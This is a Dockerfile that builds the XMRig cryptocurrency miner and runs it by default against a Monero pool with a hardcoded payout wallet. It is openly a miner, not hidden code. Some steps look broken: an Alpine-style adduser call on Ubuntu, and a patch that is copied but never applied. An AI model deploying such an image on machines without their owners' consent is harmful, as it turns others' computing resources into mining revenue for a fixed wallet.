FROM ubuntu:latest AS build
MAINTAINER HeisIT, <admin@heis.in>


ARG XMRIG_VERSION='v5.11.2'

ENV DEBIAN_FRONTEND=noninteractive

RUN adduser -D -h /home/container container

USER container
ENV  USER=container HOME=/home/container

WORKDIR /home/container


RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /home/container/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /home/container/xmrig/
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15


COPY --from=build --chown=container /home/container/xmrig/build/xmrig /home/container

WORKDIR /home/container



ENTRYPOINT ["./xmrig"]
CMD ["--url=pool.supportxmr.com:443", "--user=49yShXzy2JEB2Ze7GEYgCb3qrvhnpNcn7BiCYVqM9yWPiMiARsCnXiKW6ctX6GA3LNN5sxgmg9XGZMyQBsLDvy4fNNQ5fuz", "--pass=Server", "--tls", "-k", "--coin=monero"]˚
